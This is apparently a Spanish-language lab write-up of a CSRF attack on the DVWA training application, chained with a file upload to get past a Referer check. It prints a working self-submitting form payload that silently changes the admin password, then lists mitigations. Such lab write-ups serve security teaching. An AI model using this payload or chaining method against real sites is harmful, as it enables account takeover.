# Reporte de Explotación: CSRF Bypass (Nivel: Medium) - DVWA

Este documento detalla la explotación de una vulnerabilidad de **Cross-Site Request Forgery (CSRF)** mediante el encadenamiento con **File Upload**. El ataque aprovecha un payload alojado internamente para evadir las restricciones de seguridad basadas en el origen de la petición.

---

## 🔍 Análisis de la Vulnerabilidad

En el nivel de seguridad **Medio**, la aplicación intenta protegerse validando la cabecera `HTTP_REFERER`.

* **Mecanismo de Defensa:** El servidor verifica que la petición de cambio de contraseña provenga del mismo dominio.
* **Debilidad:** Esta defensa es ineficaz si el atacante logra colocar su código malicioso dentro del propio servidor, ya que la petición resultante tendrá un referente "interno" legítimo.

---

## 🚀 Proceso de Explotación (Chaining)

### 1. Preparación del Payload
Se utilizó un archivo PHP que contiene un formulario oculto y un script de auto-envío (`submit`) para forzar el cambio de contraseña a `pass`.

**Código del archivo `localhost.php`:**

```html
<html>
 <body>
  <script>history.pushState('', '', '/')</script>
  <form action="http://localhost/DVWA/vulnerabilities/csrf/">
   <input type="hidden" name="password&#95;new" value="pass" />
   <input type="hidden" name="password&#95;conf" value="pass" />
   <input type="hidden" name="Change" value="Change" />
   <input type="submit" value="Submit request" />
  </form>
  <script>
   document.forms[0].submit();
  </script>
 </body>
</html>
```

*El script incluye `history.pushState` para ocultar la actividad y envía los parámetros `password_new`, `password_conf` y `Change` automáticamente.*

### 2. Carga mediante File Upload
Para facilitar la subida del archivo al servidor, se ajustó temporalmente la seguridad a **Low**. Esto permitió alojar el archivo `localhost.php` en el directorio `/uploads/` del servidor víctima.

### 3. Ejecución del Ataque (Nivel Medium)
Con el archivo ya alojado y la seguridad establecida de nuevo en **Medium**, se procedió a ejecutar el ataque accediendo a la URL interna del archivo subido. 

Al ejecutarse desde el mismo dominio (`localhost`), la validación del `Referer` fue superada con éxito.

---

## 📊 Resultados

Tras la ejecución del script alojado internamente, el servidor procesó la solicitud de cambio de contraseña correctamente.

![Confirmación de cambio de contraseña](images/5.contraseña_cambiada.png)

* **Resultado:** "Password Changed."
* **Impacto:** Se logró cambiar la contraseña de administración eludiendo la seguridad de nivel medio mediante una vulnerabilidad secundaria.

---

## 🛡️ Medidas de Mitigación

Para prevenir ataques de este tipo, se recomienda:

1.  **Anti-CSRF Tokens:** Implementar tokens aleatorios únicos por sesión que el servidor valide en cada petición.
2.  **Validación Estricta de Archivos:** Evitar la subida de archivos ejecutables (`.php`, `.html`) y almacenarlos en directorios sin permisos de ejecución.
3.  **Confirmación de Contraseña:** Solicitar la contraseña actual antes de permitir el cambio a una nueva.
4.  **Atributos de Cookie SameSite:** Configurar cookies con `SameSite=Strict` para mitigar el envío de credenciales en peticiones no deseadas.

---
> **Aviso:** Este contenido es para fines educativos. El acceso no autorizado a sistemas es ilegal.
